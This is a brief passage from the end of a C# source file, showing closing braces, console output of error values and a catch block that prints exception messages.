                            {
                                Console.WriteLine($"Error: {error}");
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Exception: {ex.Message}");
            }
        }
    }


}
